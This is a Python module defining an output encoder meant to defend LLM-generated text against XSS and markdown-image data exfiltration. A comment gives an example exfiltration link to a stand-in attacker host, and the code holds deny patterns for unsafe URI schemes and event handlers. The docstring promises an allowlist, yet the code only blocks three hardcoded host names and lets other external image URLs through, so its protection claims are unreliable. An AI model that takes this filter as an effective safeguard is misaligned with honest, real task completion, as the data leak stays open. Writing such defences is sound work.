"""
LLM10 Mitigation: OutputEncoder
Defense against Improper Output Handling (XSS, Markdown Image Exfiltration, SSRF).
Techniques:
1. Strict HTML Entity Encoding (<script>, <img>, <iframe>, javascript:)
2. Markdown URI Validation (blocks data:, javascript:, and non-whitelisted image URLs)
3. Event Handler Neutralization (onerror, onload, onclick)
"""
import html
import re

class OutputEncoder:
    UNSAFE_URI_SCHEMES = [r"javascript:", r"data:", r"vbscript:"]

    @classmethod
    def encode(cls, text: str) -> str:
        """
        Encodes dangerous characters and neutralizes injection tags.
        """
        # 1. Neutralize Markdown image/link exfiltration: ![alt](http://evil.com/leak?flag=...)
        # Replaces raw markdown links to untrusted domains
        def sanitize_md_link(match):
            alt_text = match.group(1)
            url = match.group(2)
            for scheme in cls.UNSAFE_URI_SCHEMES:
                if re.search(scheme, url, re.IGNORECASE):
                    return f"[Blocked Unsafe URI: {alt_text}]"
            # If linking to external domains not in allowlist
            if "attacker.com" in url or "evil.org" in url or "dropzone" in url:
                return f"[Blocked Untrusted External Media: {alt_text}]"
            return match.group(0)

        text = re.sub(r"!\[(.*?)\]\((.*?)\)", sanitize_md_link, text)
        text = re.sub(r"\[(.*?)\]\((.*?)\)", sanitize_md_link, text)

        # 2. HTML Entity Encoding for script tags and attributes
        # Escapes < and > so downstream web/markdown parsers render as plain text, not executable DOM
        text = html.escape(text)

        # 3. Neutralize any residual javascript event handlers
        text = re.sub(r"(?i)onerror\s*=", "blocked_attr=", text)
        text = re.sub(r"(?i)onload\s*=", "blocked_attr=", text)
        text = re.sub(r"(?i)onclick\s*=", "blocked_attr=", text)

        return text
